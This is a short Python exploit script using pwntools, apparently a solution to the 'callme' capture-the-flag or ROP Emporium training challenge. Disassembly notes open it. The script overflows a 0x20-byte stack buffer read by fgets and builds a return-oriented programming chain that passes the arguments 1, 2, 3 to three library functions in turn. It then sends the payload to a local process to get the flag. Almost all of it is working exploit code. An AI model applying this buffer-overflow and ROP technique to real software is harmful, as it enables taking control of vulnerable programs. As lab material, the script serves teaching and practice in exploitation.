"""
rbp-0x20 <= buffer[0x20]
401a4f :fgets( buffer, 0x100, stdin )

 9dc:   89 7d ec                mov    DWORD PTR [rbp-0x14],edi
 9df:   89 75 e8                mov    DWORD PTR [rbp-0x18],esi
 9e2:   89 55 e4                mov    DWORD PTR [rbp-0x1c],edx
 9e5:   83 7d ec 01             cmp    DWORD PTR [rbp-0x14],0x1
 9e9:   0f 85 a2 00 00 00       jne    a91 <callme_two+0xbd>
 9ef:   83 7d e8 02             cmp    DWORD PTR [rbp-0x18],0x2
 9f3:   0f 85 98 00 00 00       jne    a91 <callme_two+0xbd>
 9f9:   83 7d e4 03             cmp    DWORD PTR [rbp-0x1c],0x3
 9fd:   0f 85 8e 00 00 00       jne    a91 <callme_two+0xbd>

"""

from pwn import *
#context.log_level = 'debug'
elf = ELF("./callme")
lib_callme = ELF("./libcallme.so")
p = process("./callme")

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
payload += p64( 0x401a56 ) #ret
payload += p64( elf.symbols["usefulGadgets"] )
payload += p64( 1 )
payload += p64( 2 )
payload += p64( 3 )
payload += p64( elf.symbols["callme_one"] )
payload += p64( elf.symbols["usefulGadgets"] )
payload += p64( 1 )
payload += p64( 2 )
payload += p64( 3 )
payload += p64( elf.symbols["callme_two"] )
payload += p64( elf.symbols["usefulGadgets"] )
payload += p64( 1 )
payload += p64( 2 )
payload += p64( 3 )
payload += p64( elf.symbols["callme_three"] )

p.recvuntil("> ")
p.sendline( payload )
info("flag is :%s", p.recv() )
